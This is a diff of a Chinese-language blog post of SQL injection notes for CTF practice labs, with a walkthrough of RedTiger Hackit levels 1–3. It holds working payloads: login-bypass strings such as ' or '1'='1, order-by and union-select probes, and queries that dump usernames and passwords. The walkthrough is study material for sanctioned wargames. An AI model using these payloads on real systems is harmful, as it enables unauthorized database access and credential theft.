@@ -14,12 +14,10 @@ category:
 
 <!-- more -->
 
+# 写在前面
 
-# 练习网站
+## mysql中select的格式
 
-[网络信息安全攻防学习平台](http://hackinglab.cn/index.php)
-
-mysql中select的格式：
 ```
 SELECT
     [ALL | DISTINCT | DISTINCTROW ]
@@ -43,6 +41,15 @@ SELECT
     [FOR UPDATE | LOCK IN SHARE MODE]]
 ```
 
+## SQL注入基本流程
+1. 判断是否存在注入点； 
+2. 判断字段回显位置； 
+3. 判断数据库信息； 
+4. 查找数据库名； 
+5. 查找数据库表； 
+6. 查找数据库表中字段以及字段值。
+
+# 练习网站 [网络信息安全攻防学习平台](http://hackinglab.cn/index.php)
 
 ## 防注入
 
@@ -556,22 +563,125 @@ https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,user,pas
 ```
 结果不对，而我观察到页面中给出的是`username`，所以换成它。
 ```
-https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,username,password from level1_us
+https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,username,password from level1_users
 
 ```
 got it.拿到用户名密码后登录即可。
 
 ## level2
 
-绕过的sql万能密码：
+首先点击登陆按钮，抓取登陆数据包。有如下字段
+	
+	username=admin&password=admin&login=Login
+先对`username`进行注入点测试，并尝试万能用户名。无果而返。
+```
+admin'
+admin' --+
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1%23
+admin')or('1'='1
+```
+接着对password测试：
+```
+'
+```
+但是得到的返回信息为：
+	
+	<b>Warning</b>:  mysql_num_rows() expects parameter 1 to be resource, boolean given in <b>/var/www/html/	hackit/level2.php</b> on line <b>48</b><br />
+	Login incorrect!
+说明存在字符型注入点。这就好办了。直接上sql万能密码
 ```
 ' or '1'='1
+```
+
+
+## level3
+
+```
+Admin'
+MDQyMjExMDE0MTgyMTQwMTc0
+Admin' and '1'='2
+MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg5MjA0MTAxMjUzMjE5MDI0MjMyMDY2MDY2MjM3
+Admin' and '1'='1
+MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg5MjA0MTAxMjUzMjE5MDI0MjMyMDY2MDY2MjM4
+```
+
+```
+Admin' order by 8#
+MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMxMDY2 # 报错
+Admin' order by 7#
+MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY2 # 不报错
+```
+
+显示位还显示的Admin的信息，那找个数据库中没有的显示。
+```
+Admin' union select 1,2,3,4,5,6,7#
+MDQyMjExMDE0MTgyMTQwMTc0MjIzMDc3MjA0MTA0MTc4MTQ2MDA5MTg4MDI2MDA5MTg2MDAyMjMzMDc0MDYwMTk5MjM3MjE5MDg3MjQ2MTU0MjA4MTc2MDk2MTMxMjIwMDUxMDU5
+```
+
+```
+max' union select 1,2,3,4,5,6,7#
+MDA2MjE0MDI3MjQ4MTk0MjUyMTQ1MDgxMjA1MTExMjUzMTQzMDc2MTYzMDI2MDA2MTcxMDY1MTcyMDcwMDYzMTk5MjM2MjE5MDgwMjQ2MTU1MjA4MTc5MDk2MTMwMjEx
+```
+得到的回显位为：2,4,5,6,7。
+
+	Show userdetails: <br>
+					<table style="border-collapse:collapse; border:1px solid black;">
+						<tr>
+							<td>Username: </td>
+							<td>2</td>
+						</tr>
+						<tr>
+							<td>First name: </td>
+							<td>6</td>
+						</tr>
+						<tr>
+							<td>Name: </td>
+							<td>7</td>
+						</tr>
+						<tr>
+							<td>ICQ: </td>
+							<td>5</td>
+						</tr>
+						<tr>
+							<td>Email: </td>
+							<td>4</td>
+						</tr>
+					</table>	
+				<br><br><br>
+
+
+```
+# max' union select 1,2,3,4,5,6,(column_name) from information_schema.columns where table_name='level3_users' limit 0,1#
+MDA2MjE0MDI3MjQ4MTk0MjUyMTQ1MDgxMjA1MTExMjUzMTQzMDc2MTYzMDI2MDA2MTcxMDY1MTcyMDcwMDYzMTk5MjM2MjE5MDgwMjQ2MTU1MjA4MTc5MDk2MTU3MTQ3MTA3MTE2MTY1MTM5MjA0MTQ0MTEyMDM3MTg5MTUzMTA0MjE4MTcwMTc4MDE1MTk4MDAyMTUxMTIwMDg2MTMzMTMyMDY5MDQ3MTY0MTkwMDM3MDU2MTI0MTQwMDM2MDc5MTI1MTIyMTExMTQ5MTMyMDY2MTQ3MjA1MDcxMDQ3MTkzMjE0MTE3MTIzMTk5MDg3MTE5MTUzMDMzMTU3MjA1MDE3MDQ3MjIzMDU4MjQ0MTg3MDI5MTY4MDU4MjA0MjAzMDY2MjAyMDA1MDQ3MTMxMDI4MTY3MDk4MjE2MjQ0MjE3MTQwMjQ2MjAxMTg4MTk3MDQ2MDA3MTUzMDM3MTQ4MjA4
+```
+尝试暴列名出错。
+
+	Show userdetails: <br>Some things are disabled!!!
+还好知道字段，`password`，直接泄露即可。
+
+```
+# max' union select 1,2,3,4,5,6,password from level3_users where username='Admin'#
+MDA2MjE0MDI3MjQ4MTk0MjUyMTQ1MDgxMjA1MTExMjUzMTQzMDc2MTYzMDI2MDA2MTcxMDY1MTcyMDcwMDYzMTk5MjM2MjE5MDgwMjQ2MTU1MjA4MTc5MDk2MTk3MTQ1MTE5MTA3MTY3MTM3MjA4MTcxMDYyMDM0MTYyMTQ3MDQ0MjE4MTYwMTY1MDIyMjA2MDc4MjA1MDczMDY5MTUzMTQ3MDkwMDYxMjQwMTYwMDM0MDUxMDgxMTU0MTAzMDgyMTA3MTE0MTI0MjEzMTM0MDY0MTU0MTMzMDEzMDAwMjE0MTU1MTA3MTI1MTMzMDA2
+```
+
+代码可以写作：
+```
+$payload2 ="max' union select 1,2,3,4,5,6,password from level3_users where username='Admin'#";
+print_r($payload2);
+print '<br>';
+$en_payload = encrypt($payload2);
+print_r($en_payload);
+print '<br>';
+
 ```
 
 ## 参考网站
 [1] [SQL 注入](https://ctf-wiki.github.io/ctf-wiki/web/sqli/)
 [2] [SQL注入教程——（三）简单的注入尝试](http://blog.csdn.net/helloc0de/article/details/76142478)
-
+[3] [Redtiger Hackit Writeup](https://blog.spoock.com/2016/07/25/redtiger-writeup/)
 
 # sqli-labs
 
